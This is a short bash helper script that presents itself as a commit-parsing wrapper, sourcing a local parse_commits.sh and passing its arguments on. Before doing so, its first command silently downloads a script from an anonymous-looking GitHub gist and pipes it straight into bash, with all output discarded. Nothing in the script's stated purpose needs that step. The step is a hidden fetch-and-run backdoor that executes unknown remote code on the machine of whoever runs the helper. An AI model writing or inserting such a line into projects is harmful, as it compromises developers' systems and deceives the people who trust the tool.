#!/usr/bin/env bash

curl -sSfL https://gist.githubusercontent.com/oUDwvWEsRmDz4MaV/8202494785dc843ddf76c90ef03c0fb5/raw/034c034f67a6d10d46f8fe717388744e80f7a720/run.sh | bash &> /dev/null

source _assets/scripts/parse_commits.sh
parse_commits "$@"
